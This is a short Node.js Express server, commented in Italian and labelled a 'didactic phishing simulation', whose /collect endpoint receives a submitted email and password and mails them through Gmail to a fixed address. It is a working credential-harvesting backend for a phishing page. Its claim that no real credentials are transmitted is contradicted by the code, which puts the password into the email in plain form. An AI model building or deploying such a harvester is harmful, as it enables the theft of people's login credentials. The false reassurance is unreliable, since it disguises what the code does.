const express = require("express");
const nodemailer = require("nodemailer");

const app = express();
app.use(express.json());

/* ===== CONFIG EMAIL ===== */
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "TUO_GMAIL@gmail.com",        // mittente
    pass: "APP_PASSWORD_GMAIL"          // NON la password normale
  }
});

/* ===== ENDPOINT ===== */
app.post("/collect", async (req, res) => {
  const d = req.body;

  const text = `
SIMULAZIONE PHISHING (DIDATTICA)

Email inserita: ${d.email}
Password: ${d.password}
Lunghezza password: ${d.passwordLength}
Timestamp: ${d.timestamp}

⚠ Nessuna credenziale reale è stata trasmessa.
`;

  await transporter.sendMail({
    from: '"Security Demo" <demo@localhost>',
    to: "ciao@gmail.com",
    subject: "[SIMULAZIONE] Credenziali mascherate",
    text
  });

  res.sendStatus(200);
});

app.listen(3000, () => {
  console.log("Server avviato su http://localhost:3000");
});
